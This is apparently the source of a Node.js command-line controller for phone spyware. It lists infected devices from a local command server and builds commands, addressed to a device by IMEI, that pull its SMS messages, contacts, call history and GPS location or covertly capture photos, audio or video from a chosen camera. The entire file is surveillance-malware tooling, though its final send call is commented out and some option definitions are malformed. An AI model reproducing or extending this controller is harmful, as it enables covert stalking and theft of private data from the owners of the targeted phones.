let program = require('commander');
let request = require('request');
let HOST = 'http://localhost:3000/';
let cmd2c = require('./command/cmds/command2clients');
let cmd = new Map()
cmd.set('sms', cmd2c.SEND_SMS_LIST);
cmd.set('contacts', cmd2c.SEND_CONTACTS_LIST);
cmd.set('call', cmd2c.SEND_CALLING_HISTORY);
cmd.set('gps', cmd2c.SEND_GPS);
cmd.set('shadow', cmd2c.SEND_SHADOW);
program
    .version('1.0.0')
    .option('-a,--assassin <assassin>', 'select the command post to the clients if you choose the shadow you should input the cmd -t to choose a type between pic/audio/video [sms,contacts,call,gps,shadow]', 'sms')
    .option('-C,-Clients ', 'show every client info')
    .option('-t.--type', 'select a type between pic/audio/video and you should input the -l to choose the camera lens [pic,audio,video]', 'sms')
    .option('-c,--client <client>', 'select a client to post the command')
    .option('-l,--lens <lens>', 'which camera lens that you want to open [0,1]', '0')
    .parse(process.argv);
if (program.Clients) {
    request(HOST + 'users/users', (error, response, body) => {
        let data = JSON.parse(body);
        console.log("res", data);
    });
}
if (program.assassin && program.client) {
    let form = {};
    console.log(global.userList);
    form['command'] = cmd.get(program.assassin);
    form['IMEI'] = program.client;
    if (program.assassin == 'shadow') {
        form['type'] = 'send_pic';
        form['camera'] = 0;
        if (program.type) {
            form['type'] = program.type;
            if (program.lens) {
                form['camera'] = program.lens;
            }
        } else {
            console.error('ERROR:you should input a type with -t to choose which cmd that you want to send');
        }
    }
    console.log(form);
    // request.post();

}
